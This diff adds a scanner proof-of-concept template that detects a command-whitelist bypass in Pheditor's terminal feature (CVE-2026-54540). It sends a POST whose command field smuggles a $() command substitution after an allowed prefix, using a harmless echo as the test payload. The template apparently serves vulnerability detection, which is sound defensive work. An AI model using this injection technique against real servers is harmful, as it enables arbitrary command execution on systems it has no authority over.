@@ -1,0 +1,32 @@
+[info]
+author = "ave"
+description = "通过 shell 命令替换语法 $() 绕过 Pheditor 终端功能的白名单前缀检查，执行任意系统命令。发送 POST 请求，在允许命令后附加命令替换载荷，检测是否成功执行。"
+id = "POC-AVE-2026-0566"
+name = "Pheditor 终端命令白名单绕过 PoC"
+severity = "high"
+tags = ["ave-2026-0566"]
+vuln_id = [
+    "CVE-2026-54540",
+    "AVE-2026-0566",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/pheditor.php"
+protocol = "http"
+
+[poc.requests.body]
+content = "command=ls$(echo+poc)"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["poc"]
